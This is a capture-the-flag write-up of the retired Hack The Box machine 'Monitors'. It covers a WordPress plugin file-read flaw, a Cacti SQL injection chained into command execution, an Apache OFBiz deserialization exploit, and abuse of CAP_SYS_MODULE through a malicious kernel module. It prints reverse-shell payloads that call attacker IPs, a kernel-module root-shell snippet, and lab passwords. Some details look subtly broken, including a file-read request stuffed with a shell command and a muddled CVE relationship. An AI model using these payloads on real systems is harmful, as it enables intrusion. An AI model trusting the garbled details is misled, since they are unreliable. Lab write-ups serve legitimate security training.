# Monitors

| | |
|---|---|
| **Platform** | Hack The Box |
| **OS** | Linux |
| **Difficulty** | Hard |
| **IP Address** | 10.10.10.238 |
| **Status** | Retired |

## Overview
Monitors is a Hard Linux machine that chains together three separate services: a vulnerable WordPress plugin, a vulnerable Cacti installation, and Apache OFBiz running inside Docker. The WordPress plugin's Local File Inclusion/SSRF-style flaw is used to disclose server configuration and pivot to a Cacti admin panel, whose SQL injection is chained into command execution for an initial low-privileged shell. From there, credentials recovered from a backup script provide SSH access, and finally a Java/XML-RPC deserialization exploit against Apache OFBiz (running in a container reachable only from the host) yields a shell with the `CAP_SYS_MODULE` capability, which is abused to load a malicious kernel module and gain root on the host.

## Reconnaissance
```
22/tcp open  ssh
80/tcp open  http    WordPress 5.5.1 - "Welcome to Monitor: Taking hardware monitoring seriously"
```
A full port scan confirmed only 22 and 80 were exposed externally. The site referenced the hostnames `monitors.htb` / `monitor.htb`, and WordPress comments/copyright metadata (2018) hinted at an old plugin set: `wp-with-spritz` (v1.0) stood out as a candidate for public exploits.

## Enumeration
`wp-with-spritz` is affected by a public LFI/SSRF vulnerability (exploit-db #44544) via `wp.spritz.content.filter.php?url=`. Directory traversal through this parameter was used to read arbitrary files on the host, e.g.:

```
GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.phps?url=/../../../../%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.68%2F1339%200%3E%261
GET /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/apache2/sites-available/monitors.htb.conf
```
Reading the Apache vhost configs disclosed a second vhost, `cacti-admin.monitors.htb`, serving Cacti 1.2.12, plus the WordPress database credentials in `wp-config.php` (`wpadmin:BestAdministrator@2020!`), which were also valid for the Cacti admin panel (`admin:BestAdministrator@2020!`).

## Foothold
Cacti 1.2.12 is vulnerable to an authenticated SQL injection in `color.php` (tracked upstream at github.com/Cacti/cacti/issues/3622) that can be chained into command execution by updating the `path_php_binary` setting via a `UNION SELECT` and re-triggering it through the poller (`host.php?action=reindex`):

```
GET /cacti/color.php?action=export&header=false&filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>&1|nc+10.10.14.104+1331+>/tmp/f;'+where+name='path_php_binary';--+-

GET /cacti/host.php?action=reindex&host_id=1
```
This produced a reverse shell as the web-server user. Enumerating the filesystem uncovered `/home/marcus/.backup/backup.sh`, which contained the credential `marcus:VerticalEdge2020`, reused successfully over SSH.

## Privilege Escalation
As `marcus`, `linpeas` enumeration showed a Docker daemon and a `docker-proxy` forwarding local port 8443 to a container (172.17.0.2:8443) running **Apache Tomcat 9.0.31 / Apache OFBiz**. Port-forwarding this service to the attacking box (`ssh -L 8443:127.0.0.1:8443 marcus@monitors.htb`) exposed OFBiz's XML-RPC endpoint, vulnerable to **CVE-2020-9496** (a follow-on of CVE-2020-9484), exploitable with Metasploit's `exploit/linux/http/apache_ofbiz_deserialization` module. This produced a shell inside the OFBiz container.

Inside the container, `capsh --print` revealed the process held the **`CAP_SYS_MODULE`** Linux capability: meaning it can load arbitrary kernel modules into the *host* kernel despite being namespaced. `files/lol123.c` (built with `files/makefile`) implements a minimal LKM that calls `call_usermodehelper()` to spawn a reverse shell as root when inserted:

```c
static int __init lol123_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
```
After compiling the module against the target kernel headers and forwarding the reverse-shell port, `insmod lol123.ko` executed the module-init hook with root privileges on the host, yielding a full root shell.

## Lessons Learned
- Old, unmaintained WordPress plugins (like `wp-with-spritz`) are a common LFI/SSRF vector even years after disclosure: plugin inventories should be actively audited.
- Reusing the same admin password across WordPress and Cacti allowed a single credential leak to compromise two separate applications.
- `CAP_SYS_MODULE` should never be granted to a container that isn't fully trusted: it is equivalent to root on the host kernel.

## Tools & References
- `files/lol123.c`, `files/makefile`: kernel module reverse-shell PoC abusing `CAP_SYS_MODULE`, referenced in the HTB/AttackDefense community writeups for this technique.
- `files/test.php`, `files/test.xml`: small test payloads used while validating command execution (PHP `exec()` ping test) and the OFBiz XML-RPC/`ProcessBuilder` deserialization gadget.
- exploit-db #44544: WordPress `wp-with-spritz` LFI/SSRF.
- Cacti SQL injection → RCE, tracked at github.com/Cacti/cacti/issues/3622.
- CVE-2020-9484 / CVE-2020-9496: Apache OFBiz XML-RPC deserialization (Metasploit `exploit/linux/http/apache_ofbiz_deserialization`).
- `client.cert` / `client.key`: a TLS client certificate/key pair captured during testing: omitted from the repository as private key material; it was not required to reproduce the documented attack path.
